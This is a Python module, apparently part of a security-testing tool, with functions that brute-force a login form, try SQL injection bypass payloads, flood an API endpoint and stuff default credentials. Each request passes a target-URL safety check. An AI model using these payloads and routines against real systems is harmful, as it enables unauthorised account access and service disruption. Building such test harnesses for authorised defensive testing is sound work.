"""Attack function library — each returns a structured result dict."""

import time
from datetime import datetime, timezone
from typing import Any

import requests

from safety import SafetyViolationError, validate_target_url

COMMON_PASSWORDS = [
    "password", "123456", "admin", "password123", "letmein",
    "welcome", "monkey", "dragon", "master", "qwerty",
    "admin123", "root", "toor", "pass", "test",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' OR '1'='1' --",
    "1' OR '1'='1",
    "' UNION SELECT NULL--",
    "admin' OR '1'='1",
]

CREDENTIAL_PAIRS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("user", "user"),
    ("test", "test"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("admin", "admin123"),
]


def _utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _make_result(
    attack_type: str,
    payload_used: str,
    success: bool,
    response_time_ms: float,
    *,
    blocked: bool = False,
    status_code: int | None = None,
    extra: dict[str, Any] | None = None,
) -> dict[str, Any]:
    result: dict[str, Any] = {
        "attack_type": attack_type,
        "payload_used": payload_used,
        "success": success,
        "response_time_ms": round(response_time_ms, 2),
        "timestamp": _utc_now(),
        "blocked": blocked,
    }
    if status_code is not None:
        result["status_code"] = status_code
    if extra:
        result.update(extra)
    return result


def _safe_request(method: str, url: str, **kwargs) -> requests.Response:
    validate_target_url(url)
    return requests.request(method, url, timeout=10, **kwargs)


def _login_success(response: requests.Response) -> bool:
    if response.status_code == 403:
        return False
    text = response.text.lower()
    if "blocked" in text or "access denied" in text:
        return False
    if response.status_code == 200:
        if "welcome" in text or "dashboard" in text or "logout" in text:
            return True
        if "invalid" in text or "failed" in text or "error" in text:
            return False
    return response.status_code in (301, 302)


def brute_force_login(target_url: str, username: str = "admin") -> dict[str, Any]:
    """Try common passwords against the login form."""
    attack_type = "brute_force_login"
    login_url = f"{target_url.rstrip('/')}/login"

    for password in COMMON_PASSWORDS:
        start = time.perf_counter()
        try:
            response = _safe_request(
                "POST",
                login_url,
                data={"username": username, "password": password},
                allow_redirects=False,
            )
            elapsed = (time.perf_counter() - start) * 1000
            payload = f"{username}:{password}"
            blocked = response.status_code == 403 or "blocked" in response.text.lower()

            if _login_success(response):
                return _make_result(attack_type, payload, True, elapsed,
                                    blocked=blocked, status_code=response.status_code)

            if blocked:
                return _make_result(attack_type, payload, False, elapsed,
                                    blocked=True, status_code=response.status_code)
        except SafetyViolationError:
            raise
        except requests.RequestException as exc:
            elapsed = (time.perf_counter() - start) * 1000
            return _make_result(attack_type, f"{username}:{password}", False, elapsed,
                                extra={"error": str(exc)})

    return _make_result(
        attack_type,
        f"{username}:<all {len(COMMON_PASSWORDS)} passwords>",
        False,
        0,
    )


def sql_injection_login(target_url: str) -> dict[str, Any]:
    """Try SQL injection payloads on the login form."""
    attack_type = "sql_injection_login"
    login_url = f"{target_url.rstrip('/')}/login"

    for payload in SQLI_PAYLOADS:
        start = time.perf_counter()
        try:
            response = _safe_request(
                "POST",
                login_url,
                data={"username": payload, "password": payload},
                allow_redirects=False,
            )
            elapsed = (time.perf_counter() - start) * 1000
            blocked = response.status_code == 403 or "blocked" in response.text.lower()

            if _login_success(response):
                return _make_result(attack_type, payload, True, elapsed,
                                    blocked=blocked, status_code=response.status_code)

            if blocked:
                return _make_result(attack_type, payload, False, elapsed,
                                    blocked=True, status_code=response.status_code)
        except SafetyViolationError:
            raise
        except requests.RequestException as exc:
            elapsed = (time.perf_counter() - start) * 1000
            return _make_result(attack_type, payload, False, elapsed, extra={"error": str(exc)})

    return _make_result(attack_type, f"<all {len(SQLI_PAYLOADS)} payloads>", False, 0)


def api_flood(target_url: str, endpoint: str = "/api/users", count: int = 30) -> dict[str, Any]:
    """Send rapid repeated requests to an API endpoint."""
    attack_type = "api_flood"
    url = f"{target_url.rstrip('/')}{endpoint}"
    successes = 0
    blocked = False
    total_time = 0.0
    last_status = None

    for _ in range(count):
        start = time.perf_counter()
        try:
            response = _safe_request("GET", url)
            elapsed = (time.perf_counter() - start) * 1000
            total_time += elapsed
            last_status = response.status_code
            if response.status_code == 200:
                successes += 1
            if response.status_code == 403 or "blocked" in response.text.lower():
                blocked = True
                break
        except SafetyViolationError:
            raise
        except requests.RequestException:
            break

    avg_time = total_time / max(count, 1)
    return _make_result(
        attack_type,
        f"GET {endpoint} x{count}",
        successes > 0,
        avg_time,
        blocked=blocked,
        status_code=last_status,
        extra={"requests_sent": count, "successful_responses": successes},
    )


def credential_stuffing(target_url: str) -> dict[str, Any]:
    """Try common username/password pairs."""
    attack_type = "credential_stuffing"
    login_url = f"{target_url.rstrip('/')}/login"

    for username, password in CREDENTIAL_PAIRS:
        start = time.perf_counter()
        try:
            response = _safe_request(
                "POST",
                login_url,
                data={"username": username, "password": password},
                allow_redirects=False,
            )
            elapsed = (time.perf_counter() - start) * 1000
            payload = f"{username}:{password}"
            blocked = response.status_code == 403 or "blocked" in response.text.lower()

            if _login_success(response):
                return _make_result(attack_type, payload, True, elapsed,
                                    blocked=blocked, status_code=response.status_code)

            if blocked:
                return _make_result(attack_type, payload, False, elapsed,
                                    blocked=True, status_code=response.status_code)
        except SafetyViolationError:
            raise
        except requests.RequestException as exc:
            elapsed = (time.perf_counter() - start) * 1000
            return _make_result(attack_type, f"{username}:{password}", False, elapsed,
                                extra={"error": str(exc)})

    return _make_result(
        attack_type,
        f"<all {len(CREDENTIAL_PAIRS)} pairs>",
        False,
        0,
    )


ATTACK_FUNCTIONS = {
    "brute_force_login": brute_force_login,
    "sql_injection_login": sql_injection_login,
    "api_flood": api_flood,
    "credential_stuffing": credential_stuffing,
}
